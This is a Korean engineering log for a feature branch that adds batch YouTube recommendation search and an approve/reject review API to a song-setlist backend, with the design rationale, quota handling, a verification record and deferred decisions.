- **브랜치**: `feature/youtube-batch-review` (`develop`과 같은 커밋 `1550a60`에 있던 빈 브랜치를 그대로 사용. 분기 전 로컬 `develop`이 `origin/develop`과 동일함을 확인)
- **커밋**: 마이그레이션 `49ca245` / 클라이언트·스코어링 `15b7f13` / 배치 `201ba44` / 리뷰 `771d0a0` / F013·songs 연동 `389afa5` / 중단 응답 혼합안 `bf642c9` / PRD 정정 `75b9bc5` / 게이트 2 결과 기록 `c89db8b` / 후보 선정 원본 순서 `b004837` / allowlist 축소 `63bf0ae` / 이 문서
- **관련 PR**: work02-6b, `feat: 유튜브 배치 추천 검색 및 추천 리뷰(승인/반려) API 구현` (푸시/PR 생성은 보류)
- **상태**: 구현·단위 테스트·프로덕션 SELECT 전용 검증·**게이트 2(실제 YouTube 호출 7회 + 임시 데이터 쓰기 검증 36/36)까지 완료.** **59곡 전체 배치는 실행하지 않고 보류했다**(아래 "보류된 운영 실행")

### 배경

6단계 1/2(§14)가 `Setlist.youtube_review_status`(pending/approved/rejected) 하나만 추가한 탓에 "아직 검색하지 않음"과 "검색했으나 결과 0건"과 "검색됐고 리뷰 대기"를 구분할 수 없었다. 이번 단계는 그 한계를 시도 기록 테이블로 풀고, 배치 검색(F011)과 리뷰(F012)를 그 위에 얹는다. 1/2에서 이월된 결정 셋(곡 수정 시 검토 상태, URL 제거 정책, 형식 DB CHECK)도 여기서 답했다.

### 구현 전 조사에서 드러난 것 (설계를 바꾼 사실들)

| 조사 항목 | 확인된 사실 | 설계에 미친 영향 |
| --- | --- | --- |
| PRD "키 분리로 방문자 폴백 쿼터를 보호" | 쿼터는 **API 키가 아니라 Cloud 프로젝트**에 귀속된다(구글 문서: "the project associated with the API key is used as the quota project"). 같은 프로젝트에서 키만 두 개 만들면 `search.list`의 일일 100회 버킷을 그대로 공유한다 | PRD 전제가 성립하지 않아 **배치 전용 Cloud 프로젝트를 따로 만들고** 앱 일일 상한 80을 더한다(쿼터 전략 C). 실제 할당량 화면에서 `Search Queries per day = 100`, `per minute = 100` 확인. 키 변수명은 프론트와 구분해 `YOUTUBE_BATCH_API_KEY`. **PRD `prd-admin.md`의 해당 서술은 `75b9bc5`에서 사실에 맞게 정정했다**("서로 다른 Cloud 프로젝트의 키를 쓴다"로 고치고 근거 문서 링크를 달았다) |
| `search.list` 비용 | 별도 쿼터 버킷, 기본 하루 100회. `videos.list`는 1 unit(공용 10,000 풀) | 곡당 `search.list` 1회만 쓰고 `videos.list`는 붙이지 않는다 |
| 쿼터 리셋 시각 | **태평양 시간 자정**. Quota Calculator 페이지("Daily quotas reset at midnight Pacific Time (PT).")와 Cloud Quotas overview("For per-day quotas, the time period resets at midnight Pacific Time.") 두 곳의 문장 | 일일 사용량을 태평양 시간 날짜로 센다. **인용은 fetch 도구가 돌려준 문장이며 원문과 글자 단위로 대조하지는 않았다.** 처음 조사에서는 이 문장을 찾지 못했다고 보고했는데 질의가 비용표에만 맞춰져 있었기 때문이다 |
| 키 전달 방식 | `X-goog-api-key` 헤더 지원. 쿼리 방식은 구글이 "exposing your key to theft through URL scans"라고 경고 | 헤더로만 보낸다. 부수 효과로 요청 URL이 에러·로그에 섞여도 키가 새지 않는다 |
| 썸네일 호스트 | 공식 문서의 `search` 리소스 스키마에 `snippet.thumbnails.*.url`은 있지만 **예시 URL의 호스트가 없다** | **실측 확정(게이트 2): 응답 150건 전부 `i.ytimg.com`**(`default.jpg`·`mqdefault.jpg`·`hqdefault.jpg` 3종, 형태 `https://i.ytimg.com/vi/<id>/<size>.jpg`). allowlist에 추측으로 넣었던 `img.youtube.com`은 한 번도 관측되지 않아 **제거했다**(`63bf0ae`, 현재 허용 호스트는 `i.ytimg.com` 하나) |
| 저장·캐시 정책 | Developer Policies가 비인증 데이터를 "not longer than 30 calendar days" 보관하도록 하고 이후 "delete or refresh"를 요구 | 후보 행은 리뷰가 끝나는 순간 삭제한다. **이 조항이 검색 결과 메타데이터에 적용된다는 해석은 구현자의 것이며 법적 확인을 받지 않았다** |
| 세션 레벨 advisory lock | `PrismaService`가 `PrismaPg`에 connectionString만 넘겨 어댑터가 `pg.Pool`(기본 max 10)을 만들고, 트랜잭션 밖의 `$queryRaw`는 `pool.query`로 매번 빌렸다 반납한다(`@prisma/adapter-pg`의 `PgQueryable.performIO`). 커넥션을 고정하는 경로는 `startTransaction`뿐 | 잠금을 잡은 커넥션과 푸는 커넥션이 다를 수 있어 **프로세스 내 mutex + DB 예약 기록**으로 바꿨다 |
| 새 테이블의 기본 권한 | `pg_default_acl` 실측: `public`의 신규 테이블에 `anon`/`authenticated`가 `arwdDxtm`, 시퀀스에 `rwU`. RLS는 TRUNCATE에 적용되지 않는다 | 새 테이블·시퀀스 모두 RLS 활성 + 정책 없음 + `REVOKE ALL`(§9 방식만으로는 방어 계층 하나가 빈다) |
| 프론트 폴백 | `search.list` 1회/클릭, 캐시 없음(`no-store`), 키는 URL 쿼리(`key=`). `youtubeUrl`이 있으면 API를 호출하지 않는다 | URL이 채워질수록 폴백 호출이 줄어든다. 스코어링 로직이 두 벌이 되는 드리프트는 특성 테스트로 완화 |

### 작업 내용

**엔드포인트** (전부 인증 필요, `@Public()` 미부착 — 회귀 테스트와 실제 기동의 401로 확인)

| 메서드 | 경로 | 동작 |
| --- | --- | --- |
| `GET` | `/youtube/quota` | 오늘(태평양 시간) 사용량·상한·리셋 시각 |
| `POST` | `/youtube/recommendations/batch` | `{ limit? }`(기본 5, 최대 10). 대상을 서버가 선정해 청크 처리. 요약(처리/검색됨/결과 0건/실패/중단 사유/남은 대상/쿼터) 반환. **쿼터 소진으로 결과를 하나도 못 내면 `429 + Retry-After`, 키 오류는 `500`, 부분 성공·연속 실패 중단은 `200 + abortedBy`** |
| `GET` | `/youtube/recommendations` | `?state`(기본 `open`), `limit`, `cursor`. 후보 포함, 30일 지난 후보는 제외 |
| `POST` | `/youtube/recommendations/:attemptId/approve` | `{ videoId }` — 후보 중 선택. `SongResponse` 반환 |
| `POST` | `/youtube/recommendations/:attemptId/reject` | `{ reason? }` |
| `POST` | `/youtube/songs/:songId/requeue` | 반려·결과 0건 곡을 배치 대상으로 되돌림 |

**한 곡의 처리 순서** — `① 예약 행 INSERT(즉시 커밋) → ② 외부 호출(트랜잭션·잠금 없음, 5초 타임아웃) → ③ 후보 INSERT + 시도 UPDATE(한 트랜잭션)`. ①이 호출 **전에** 커밋되므로 ② 도중 프로세스가 죽어도 행이 남아 쿼터 집계에 포함된다.

**실패 분류 — `completedAt`이 기준이다** (스키마 변경 없이 `completedAt`의 의미를 "외부 호출이 이 곡에 대한 판정으로 귀결된 시각"으로 정의)

| 상황 | outcome | completedAt | 일일 쿼터 집계 | 곡별 연속 실패수 | 배치 |
| --- | --- | --- | --- | --- | --- |
| 타임아웃 / 5xx / 파싱 실패 | failed | **채움** | 포함 | **포함** | 연속 3회면 중단 |
| 쿼터 초과 / 키 오류 | failed | **NULL** | 포함 | **제외** | 즉시 중단 |
| 크래시 잔재(10분 넘은 예약) | failed | **NULL** | 포함 | **제외** | 정리 시 전환 |

**시도 상태 전이** (`outcome` × `reviewState`는 DB CHECK로 강제 — §14가 `Setlist`에 CHECK를 걸지 않은 이유(work03 대량 삽입 실패)가 서비스 코드만 쓰는 이 두 테이블에는 해당하지 않는다)

| 전이 | 계기 |
| --- | --- |
| (없음) → `reserved`/`closed` | 배치 예약 |
| `reserved` → `searched`/`open` | 후보 1개 이상 |
| `reserved` → `no_results`/`closed` | 저장 가능한 후보 0개 |
| `reserved` → `failed`/`closed` | 실패, 또는 10분 넘은 예약 정리 |
| `searched`/`open` → `approved` / `rejected` | F012 승인 / 반려 (후보 전량 삭제) |
| `searched`/`open` → `superseded` | F013 수동 입력, 곡 제목·가수 실제 변경 (후보 전량 삭제) |
| `searched`/`open` → `expired` | 30일 경과 정리 (후보 전량 삭제) |

**대상 선정** — `url IS NULL AND status='pending'`이면서 (무효화되지 않은 이력 기준) 열린 추천 없음 / 결과 0건 없음 / 10분 이내 예약 없음 / 연속 실패 3회 미만. 정렬은 마지막 시도가 없는 곡이 먼저(`NULLS FIRST`) 그다음 마지막 시도가 오래된 순이라, 실패를 반복하는 곡이 신규 곡의 쿼터를 뺏지 않는다.

**잠금 순서** — `Line Up → Setlist → YoutubeSearchAttempt`. **단일 출처는 `src/common/lock-order.ts`의 주석**이고 `lock-order.spec.ts`가 순서와 "모든 경로가 이 순서의 부분열"임을 고정한다. 곡 등록(1→2), 곡 수정(1→2→3), F013·승인·반려·재큐(2→3), 배치(3)이며 역순 경로가 없어 데드락이 성립하지 않는다.

### 기술 판단

| 쟁점 | 결정 | 이유 |
| --- | --- | --- |
| 스코어링 재사용 | **apps/api로 이식 + 특성 테스트** (공용 패키지 ✗, 프론트 라우트 HTTP 호출 ✗) | 패키지를 만들면 Vercel root directory(`.`)를 건드려 프로덕션 배포 위험(§9가 web 이동을 보류한 것과 같은 이유). HTTP 호출은 백엔드가 프론트 배포에 종속되고 별도 Cloud 프로젝트 키와 충돌한다. 가중치는 하나도 바꾸지 않았고, 프론트 구현을 그대로 복사해 값을 비교하는 특성 테스트가 드리프트를 잡는다 |
| 쿼터 추적 | **DB**(시도 행의 `searchedAt`을 태평양 시간 날짜로 집계, 별도 카운터 ✗) | 인메모리는 재시작하면 0으로 돌아가 상한이 무의미해진다. 카운터를 따로 두면 실제 시도와 어긋날 수 있는 경로가 생긴다 |
| 분당 아웃바운드 상한 | **두지 않음** | 하루 총합을 80으로 막으면 하루치를 1분에 쏟아부어도 분당 100을 넘지 못한다. 발동할 수 없는 장치는 읽는 사람에게 방어가 있다는 착각만 준다(iTunes는 분당 제한만 있어 반대 상황이었다) |
| 동시 실행 방지 | **프로세스 내 mutex** (advisory lock ✗, 부분 유니크 인덱스 ✗) | 위 조사 참조. 부분 유니크 인덱스 `(songId) WHERE outcome='reserved'`는 같은 곡 동시 예약만 막고 정작 위험한 **일일 80회 초과**(두 프로세스가 COUNT를 동시에 읽는 TOCTOU)와 다른 곡 동시 예약은 못 막으며, 크래시 직후 sweep 전에 정상 재예약이 거부되는 새 실패 모드를 만든다. §13의 인메모리 아웃바운드 상한과 같은 전제(단일 상주 인스턴스)라 스케일아웃 논의 시점에 함께 판단한다 |
| 예약 기록 | **호출 전에 행을 커밋** | 쿼터를 적게 세는 쪽이 훨씬 위험하다(하루 100회) |
| 실패 분류 | **`completedAt` 의미 정의** (컬럼 추가 ✗) | 스키마를 바꾸지 않고 "곡 탓이 아닌 실패"를 구분한다. 더 명시적인 `failureScope` 컬럼은 별도 마이그레이션이 필요해 채택하지 않았다 |
| 테이블 구조 | **시도 + 후보 2개**, 후보 3개 | 곡당 후보 N행 단일 테이블로는 "검색했는데 0건"을 표현할 행이 없다 |
| 후보 선정 | **YouTube 원본 순서 상위 3개**, 점수는 참고값으로만 저장 (점수 정렬 ✗) | 게이트 2 캘리브레이션에서 점수 정렬이 원본 순서보다 나빴다(승인된 5곡 기준 상위 3 적중 1/5 대 원본 순서 4/5). 원본 순서에는 동점이 없어 점수는 타이브레이커로도 개입하지 않는다. 표본 5곡의 관측이라 일반화하지 않는다 |
| 리뷰 단위 | **곡 단위**, 승인은 `videoId`로 지목 | 한 곡에 영상은 하나만 연결된다. 등수로 지목하면 목록 갱신 사이에 대상이 달라질 수 있다 |
| 승인 원자성 | 곡 `FOR UPDATE` → 시도 `FOR UPDATE`, 잠금 안에서 3가지 재확인 | ①곡에 URL이 아직 없고 pending인가(409, F013 경합) ②시도가 아직 open인가(409, 재승인은 멱등 200이 아니다) ③고른 영상이 이 시도의 후보인가(400) |
| 저장 URL | F013과 **같은 검증 상수**(11자 형식 + 예약어)로 조립 | `videoseries`·`live_stream` 결함(§14)을 배치 경로에서도 막는다 |
| 30일 대응 | 후보는 리뷰가 끝나면 전량 삭제, 시도에는 `approvedVideoId` 대신 `approvedRank`만 | 승인된 videoId는 `Setlist.youtube_url`에만 남는다. 30일 뒤 두 테이블에 YouTube가 준 문자열은 하나도 없다. **해석은 구현자의 것** |
| F013 연동 | 열린 추천을 `superseded`로 닫음(같은 트랜잭션) | 안 닫으면 URL이 채워진 곡의 추천이 리뷰 목록에 남는다 |
| 곡 수정 시 상태 (§14 이월) | **정규화 비교로 실제 변경일 때만 `pending`으로 되돌리고 URL은 유지**, 추천 이력 무효화 | §12의 "URL 유지"(오타 교정과 곡 교체를 구분할 수 없음)를 깨지 않는다. 배치 대상이 `url NULL AND pending`이라 URL이 남은 곡은 **쿼터를 쓰는 재검색이 일어나지 않고**, "URL은 있는데 pending"이라는 표식만 남아 7단계 UI의 *재검토 필요* 목록이 된다 |
| URL 제거(null) (§14 이월) | **허용하지 않음** | 반려는 `url IS NULL`인 곡에만 일어나 비울 것이 없다. 잘못 승인된 URL 되돌리기는 PRD 밖의 새 기능이고 "approved인데 URL 없음"이라는 새 상태 조합을 만든다. SQL로만 가능 |
| `youtube_url` 형식 DB CHECK (§14 이월) | **걸지 않음** | work03 대량 삽입이 형식을 어기면 통째로 실패한다. F012의 새 쓰기 경로도 서비스가 정규화한 값만 쓴다. work03 삽입 체크리스트에 "형식 검증"을 추가한다 |
| 반려 사유 | **저장**(선택, 최대 200자) | 재큐 여부를 판단할 유일한 근거 |
| 키 없을 때 | **기동 실패**(20자 미만 포함) | JWT_SECRET·Storage 키 선례. 런타임까지 미루면 첫 배치에서야 실패하고 그때는 예약 행이 쌓인 뒤다 |

### 검증

**단위 테스트** — 전체 **712개 / 40파일**(1/2 종료 시 462개 / 27파일). `apps/api`의 `build`·`lint`(경고 0)·`test` 통과. 스펙 포함 타입 검사(`tsc --noEmit -p tsconfig.json`)는 **이번 브랜치가 만든 오류 0건**이고 기존 8건(§10)만 남았다. 고정한 것: 스코어링 특성 테스트(프론트 구현 복사본과 값 비교), 후보 선정(원본 순서 유지·**폴백의 점수 1위와 우리 1위가 다를 수 있음을 값으로 고정**·점수는 순서에 영향 없음), 썸네일 allowlist 경계(`i.ytimg.com` 하나, `img.youtube.com`·접미사 위장·userinfo 위장 거부), 클라이언트의 실패 분류와 **키가 에러·스택·cause·직렬화 어디에도 없음**, `readBatchApiKey`의 기동 검증(0/19/20자 경계, 프론트 키 이름을 읽지 않음), 배치의 예약 순서·실패 분류표 각 칸·중단 조건·부분 성공·중복 실행 409, **중단 응답 혼합안(429 + Retry-After 정확값·500·200 + abortedBy, 원본 오류 메시지에 키가 섞여도 응답·로그에 없음)**, 승인 경합 409·재승인 409·후보 밖 영상 400·DB 예약어 방어, 재큐 대상 조건, 30일 경계(29일 보임 / 31일 제외), 잠금 순서, 컨트롤러 `@Public()` 미부착과 라우트 선언.

**프로덕션 SELECT 전용 검증** (읽기만. 쓰기·외부 호출 경로는 실행 즉시 실패하도록 막아 둠)

| 대상 | 방법 | 결과 |
| --- | --- | --- |
| 대상 선정 | dist의 실제 서비스를 실제 Prisma로 호출 | **59곡** 반환, 독립 집계와 정확히 일치, 승인 5곡 제외, id 50 포함, LIMIT 바인딩 동작 |
| 대상 카운트 | 위와 같음 | 59 |
| 제외 조건 | 추천 테이블이 비어 있어 제외 분기가 한 번도 실행되지 않으므로, **소스에서 추출한 쿼리 원문에 합성 시도 이력(VALUES)을 주입** | 열린 추천·유효한 결과 0건·곡 탓 실패 3회·진행 중 예약은 제외, 쿼터·키·크래시 실패 3회·10분 넘은 예약·무효화된 이력·실패 뒤 해소된 곡은 포함. 정렬(NULLS FIRST → 오래된 시도 순)도 일치 (16/16) |
| 쿼터 집계 | 실제 서비스 호출 + **소스 SQL 원문에 고정 시각 주입**, 세션 시간대 Asia/Seoul·UTC 두 가지 | KST 15:59:59/16:00:00/16:00:01(PDT 자정 전후), 서머타임 종료 전후, 25시간짜리 날(11/1)의 6경계 × 2 = 12개 전부 기대값과 일치 |
| 행 잠금 | 소스 SQL 원문을 `BEGIN…ROLLBACK` 안에서 실행 | 실제로 잠긴다(다른 커넥션 `FOR UPDATE NOWAIT` → `55P03`), 잠금 중에도 공개 조회는 막히지 않는다, ROLLBACK 뒤 해제, 없는 곡 0행 |
| 무변경 | 전후 스냅샷 | `Setlist` 전 컬럼 diff 0, 추천 테이블 0행, **모든 시퀀스 무변화** — 위 4행 합계 **35/35** |
| 서버 기동 | `node dist/main.js`를 한 번 띄우고 종료(포트 3012) | 키가 있으면 기동하고 `/health` 200, 유튜브 라우트 7개 등록, **토큰 없는 `batch`·`quota`·`recommendations`가 전부 401**. 키를 비우면 `listen`하지 않고 exit 1, 메시지에 이름과 길이만. 두 경우 모두 로그에 키 값 없음 (13/13) |

**게이트 2 결과 (2026-09-20 14:59~15:03 KST)** — 실제 YouTube `search.list` **7회**(캘리브레이션 5 + 임시 곡 2, 재시도 0, 상한 10). 프로젝트 일일 100회의 7%, 공용 10,000 units 풀은 쓰지 않았다

| 확인한 것 | 결과 |
| --- | --- |
| `X-goog-api-key` 헤더 수락 | **첫 호출 HTTP 200** — 키를 URL이 아니라 헤더로 보내는 방식이 실제로 동작한다. 캘리브레이션 5회는 모두 HTTP 200(240~475ms, 응답 항목 10개)이고, 임시 곡 2회도 검색이 성공했다(`searched`). 임시 곡 2회의 HTTP 상태·지연은 스크립트가 직접 기록하지 않았다 |
| 썸네일 호스트 | 위 조사표 — `i.ytimg.com`만 관측, 현 allowlist 통과(저장 가능 후보 10/10) |
| `quotaExceeded` reason 문자열 | **확인하지 못했다.** 쿼터를 일부러 넘기지 않았으므로 여전히 문서에 기댄 가정이다(테스트는 대역 응답으로 고정) |

**캘리브레이션 — 승인된 5곡의 정답 videoId 위치** (프론트 폴백과 같은 검색어 구성, 저장 필터 없이 원본 10개를 점수화)

| 곡 | YouTube 원본 순서 | 우리 점수 순위 | 상위 3 저장 | 1위와 점수 차 | 정답점수 / 1위점수 |
| --- | --- | --- | --- | --- | --- |
| 27 사랑의 미학 | **3** | 3 | O | 20 | 45 / 65 |
| 30 비싼 숙취 | **4** | 9 | X | 213 | 47 / 260 |
| 59 시퍼런 봄 | **2** | 9 | X | 42 | 35 / 77 |
| 62 DETOX | **2** | 6 | X | 50 | 15 / 65 |
| 63 빨간 피터 | **1** | 6 | X | 42 | 35 / 77 |

정답이 **원본 순서로는 5곡 모두 상위 4위 안**(상위 3위 안은 4/5)인데, **점수 순위로 다시 정렬하면 상위 3에 드는 것이 1/5**로 떨어지고 **1위가 정답인 곡은 0/5**다. 이식한 스코어링이 오히려 순서를 나쁘게 만든다는 뜻이다(아래 이월 결정). 표본이 5곡이고 "정답"이 사람이 고른 영상 하나뿐이라 일반화하지 않는다.

**임시 곡 검증 (스크립트 1회, 36/36 통과, 실제 곡 미수정)** — 임시 팀 `__verify_g2__`(id 24)/`day98`, 곡 6개(id 70~75). 공개 배치 엔드포인트는 부르지 않고 `searchForSong`(곡 id 명시)만 썼다

- **실제 검색 2회**: 곡 A는 `searched/open`, 후보 3개(rank 1..3 연속, 썸네일 전부 허용 호스트), 목록 조회에 후보 포함 → 승인 → 정규화 URL + `approved`, 시도 `approved`·`approvedRank=1`, **후보 행 0개, 시도 행 어디에도 videoId 없음**, 재승인 409. 곡 B는 **동시 승인 2건 → 성공 1 + 409 1**, 최종 상태 일관
- **합성 시도 행(호출 없음)**: 반려 → `rejected`+사유·후보 삭제·자동 재검색 제외, 재큐 → `pending`·이력 무효화·**배치 대상 복귀**, 되돌릴 이유 없는 재큐 400, **결과 0건 곡도 재큐로 복귀**
- **F013·곡 수정 연동**: 수동 URL 입력이 열린 추천을 `superseded`로 닫고 후보를 지움, 제목이 실제로 바뀌면 **`pending`으로 되돌아가되 URL 유지**하고 이력 무효화, **URL이 남은 곡은 배치 대상에 들어오지 않는다**, 대소문자만 바꾸는 수정은 상태 유지, 가수가 실제로 바뀌면 되돌림
- **30일 정리**: 31일 지난 open은 정리 전에도 조회 응답에서 후보가 빠짐, `maintenance.run()` → 예약 만료 1·30일 경과 1·후보 1행 삭제, `expired`(outcome은 `searched` 유지)·`failed`(`completedAt` NULL), 정리 뒤 곡이 배치 대상으로 복귀
- **쿼터 집계**: 사용량 6 = 독립 SQL로 센 오늘(태평양) 시도 행 6 (합성·무효화 행 포함, 31일 전 행 제외)
- **경합**: 후보에 없는 영상 승인 400(곡·시도 불변), **승인 vs F013 동시 실행** → 승인 409·F013 성공·시도 `superseded`로 일관
- **CHECK·FK 아래에서 실제 쓰기가 전부 통과**했다(이전에는 코드로만 대조했던 항목)

**종료 상태**: `Line Up` 15행 / `Setlist` 64행 / `teamId` 매칭 64/64 / 분포 approved 5·pending 59 / 추천 테이블 0행 / `day98` 잔존 0 / 기존 컬럼 스냅샷 diff 0 / anon 키로 다시 읽어도 동일. **노출 창**(`/event-goods` 2일차): 첫 곡 생성 `06:02:55.655Z` → 정리 완료 `06:02:59.414Z`, **최대 3.76초**(정리 스크립트 실행 시간을 포함한 상한). **소모된 id**(시퀀스는 되돌리지 않음): `Line Up` **24** 1개(`setlist_id_seq` 23→24), `Setlist` **70~75** 6개, `YoutubeSearchAttempt` **1~8** 8개, `YoutubeRecommendation` **1~12** 12개

**확인하지 못한 것 / 가정으로 남은 것**
- **`quotaExceeded`의 reason 문자열은 실제로 받아 보지 못했다.** 쿼터를 일부러 넘기지 않았으므로 클라이언트의 분류(403 + reason `quotaExceeded`/`dailyLimitExceeded` → 쿼터 초과, 그 외 403 → 키 오류)는 문서에 기댄 **가정**이고 테스트는 대역 응답으로만 고정했다. 가정이 틀리면 쿼터 초과가 키 오류(`500`)로 분류될 수 있다 — reason을 읽지 못한 403을 보수적으로 키 오류로 보는 것과 같은 방향의 오분류다(쿼터 초과로 오분류해 배치가 조용히 하루를 쉬는 쪽보다 눈에 띈다)
- **각 커밋이 단독으로 빌드되는지는 검증하지 않았다.** 파일 의존 순서(클라이언트·스코어링 → 배치 → 리뷰·모듈 → F013·songs)로만 추론했고, 통과를 확인한 것은 브랜치 최종 트리의 `build`·`lint`·`test`·`tsc`뿐이다. 중간 커밋에서 `git bisect`를 쓴다면 빌드가 깨지는 지점이 있을 수 있다
- 임시 곡 검색 2회의 HTTP 상태·지연시간은 스크립트가 직접 기록하지 않았다(두 검색 모두 `searched`로 성공)
- **캘리브레이션은 5곡이다.** "점수 정렬이 원본 순서보다 나쁘다"는 이 5곡의 관측이고 정답도 사람이 고른 영상 하나뿐이다

**아직 하지 않은 것**
- 59곡 전체 배치 — **보류**(7단계 관리자 UI 이후. 계획은 아래 "보류된 운영 실행")

### 트러블슈팅 기록

**1) 프로덕션 검증이 리셋 시각 결함을 잡았다 — 단위 테스트는 못 잡는 종류**
`(now() AT TIME ZONE tz)::date + 1`에 `AT TIME ZONE tz`를 다시 적용하는 식이 `resets_at`을 세션 시간대에 따라 다르게 돌려줬다(실제 서비스 응답이 `2026-09-19T17:00:00Z`로 태평양 자정이 아니었다). `date`에 `AT TIME ZONE`을 쓰면 세션 시간대의 자정인 `timestamptz`로 암묵 변환되기 때문이다. `::timestamp` 캐스팅으로 고쳤고 고정 시각 12개 경계에서 검증했다. **사용량 집계(`used`)는 처음부터 맞았다**(쿼터 상한 집행에는 영향이 없었다). 단위 테스트는 DB를 대역으로 쓰므로 원리상 잡을 수 없었고, SQL 문자열 회귀 고정 테스트만 추가했다. **교훈**: 원시 SQL은 "실행해 봤다"가 검증이다.

**2) 스펙 타입 오류 8건을 만들었다가 잡았다**
인자 없는 `vi.fn(async () => …)`의 `mock.calls`가 `[]` 튜플로 추론돼 호출 인자를 꺼내는 곳에서 TS2352/TS2493이 났다. 캐스팅으로 누르지 않고 모킹 정의에 인자 타입을 명시했다. 테스트는 통과하는데 타입 검사는 실패하는 상태였고, §14에서 이미 "스펙이 타입 검사되지 않는다"고 기록한 공백이 이번에도 그대로 드러났다.

**3) 테스트 대역이 두 쿼리를 구분하지 못했다 (구현이 아니라 테스트의 오류)**
대상 선정과 카운트 쿼리를 `count(*)::int` 포함 여부로 구분했는데 공통 CTE가 두 쿼리 모두에 그 표현을 담고 있어 26건이 실패했다. 선정 쿼리에만 있는 SELECT 목록(`s.title`)으로 바꿔 고쳤다. 구현은 손대지 않았다.

**4) (게이트 1) 드라이런 중 스크립트 오류와 일시적 접속 실패**
enum 값 단언이 `name[]`을 문자열로 받아 실패했고(`::text` 캐스팅으로 수정, 스키마 문제 아님), 재실행 시 `getaddrinfo ENOTFOUND`는 SQL이 한 문장도 실행되기 전의 접속 실패였다. 읽기 전용 스냅샷으로 DB가 사전 스냅샷과 같음을 확인하고 재실행했다.

### 이 단계에서 의도적으로 하지 않은 것

- **프론트 코드 수정** — `next.config.ts`의 `remotePatterns`에 썸네일 호스트를 넣지 않았다(호스트 미확정). 프론트 폴백이 키를 URL 쿼리로 보내는 것도 그대로다
- ~~**`prd-admin.md:202` 수정**~~ — **정정 완료 (`75b9bc5`, 2026-09-20).** "키 분리로 방문자 폴백 쿼터를 보호"라는 서술은 사실과 달라(쿼터는 Cloud 프로젝트 단위, 위 조사 참조) 처음에는 문서 수정을 이번 스코프 밖으로 뒀으나, 이후 별도 커밋으로 "서로 다른 Cloud 프로젝트의 키를 쓴다"로 고치고 근거 문서 링크를 달았다
- **관리자 UI, 인바운드 throttler·CORS** (7단계), **곡 삭제·일괄 등록·oEmbed 존재 검증**
- **분당 아웃바운드 상한, 부분 유니크 인덱스** — 위 기술 판단 참조
- **`service_role`의 권한 회수** — Supabase 내부 동작에 영향을 줄 수 있어 §10의 7단계 점검 항목과 함께 본다

### 남겨둔 결정 (7단계로 이월)

- **후보 선정 — 점수 정렬을 버리고 YouTube 원본 순서 상위 3개로 결정·구현했다 (2026-09-20, `b004837`).** 게이트 2 캘리브레이션(승인된 5곡, 위 표)에서 정답이 원본 순서로는 상위 4위 안(상위 3위 안 4/5)인데 점수로 재정렬하면 상위 3에 드는 곡이 1/5, 1위가 정답인 곡은 0/5였고, 임시 곡 A(`혜성 / 윤하`)는 후보 3개가 전부 77점 동점이었다. 그래서 `selectCandidates`가 **원본 순서 그대로** 고르고 점수는 계산해 저장하되 정렬에 쓰지 않는 참고값으로만 둔다(원본 순서에는 동점이 없어 타이브레이커로도 개입하지 않는다). 저장 후보 수는 3개 그대로이고 마이그레이션 변경은 없다. **한계: 표본이 5곡이고 "정답"이 사람이 고른 영상 하나뿐이다.** 원본 순서가 낫다는 것은 이 5곡의 관측이지 일반 법칙이 아니다 — 59곡 리뷰에서 관리자가 실제로 고르는 등수(`approvedRank`)가 쌓이면 그 분포로 다시 판단한다
- **배치 중단 시 응답 방식 — 혼합안으로 결정·구현했다 (2026-09-20).** 처음 구현은 모든 중단을 `200 + abortedBy`로 돌려줘 설계 초안(쿼터 초과 `429`, 키 오류 `500`)과 달랐다. 결정한 규칙: **쿼터 초과로 멈췄고 결과를 하나도 못 냈으면(`searched`·`noResults`가 모두 0) `429` + `Retry-After`(다음 태평양 자정까지 초, 최소 1)**, **키 오류는 부분 성공이 있어도 `500`**(서버 설정 문제이고 저장한 결과는 DB에 남는다), **그 밖의 중단(부분 성공·연속 실패 3회)은 `200` + `abortedBy`**. 부분 성공을 200으로 두는 이유는 이미 저장한 후보를 응답에 담아야 하기 때문이다. 응답은 고정 문구만 싣고 원본 오류·요청 헤더는 섞이지 않으며 원본 오류 메시지에 키가 있어도 응답·로그에 나가지 않는 것을 테스트로 고정했다. 검증용 `searchForSong`에는 매핑을 적용하지 않는다. 이에 따라 메시지 상수 2개(`QUOTA_EXHAUSTED`·`API_KEY`)를 연결했고 쓰이지 않던 `UPSTREAM`·`TIMEOUT`은 삭제했다
- **재큐 경로** — 초안의 `/youtube/recommendations/songs/:songId/requeue`가 아니라 `/youtube/songs/:songId/requeue`로 구현했다(곡을 대상으로 하는 조작이라 `recommendations` 아래에 둘 이유가 없었다)
- **`previewSearch`(캘리브레이션용)는 쿼터를 쓰지만 시도 행을 남기지 않아 DB 집계에 잡히지 않는다.** 일일 상한을 100이 아니라 80으로 둔 20회의 여유가 이 용도를 덮는다. 게이트 2의 캘리브레이션 호출 수는 이 여유 안에서만 쓴다
- **썸네일 호스트 — `i.ytimg.com`으로 확정하고 allowlist를 그 하나로 줄였다 (게이트 2, `63bf0ae`).** 추측으로 넣었던 `img.youtube.com`은 제거했다. 7단계에서 `next.config.ts`의 `images.remotePatterns`에 `i.ytimg.com`을 추가하거나 `<img>`를 쓴다. 다른 호스트가 실제로 나타나면 관측한 뒤에 추가한다(추측으로 넓히지 않는다)
- **30일 정리의 스케줄러가 없다** — 정리는 배치 시작 시와 `npm run youtube:cleanup`에서만 돈다. 배치를 오래 돌리지 않으면 후보 행이 30일을 넘겨 남을 수 있다(조회 응답에서는 제외되므로 화면 노출은 없다). 크론(또는 배포 플랫폼 스케줄) 연결은 7단계 항목이다
- **mutex는 단일 상주 인스턴스 전제** — 프로세스가 둘이면 서로의 mutex를 보지 못한다. 검증 중에는 같은 DB에 다른 서버를 띄우지 않는다. `OutboundRateLimiter`(§13)와 함께 스케일아웃 논의 시점에 공유 저장소로 옮긴다
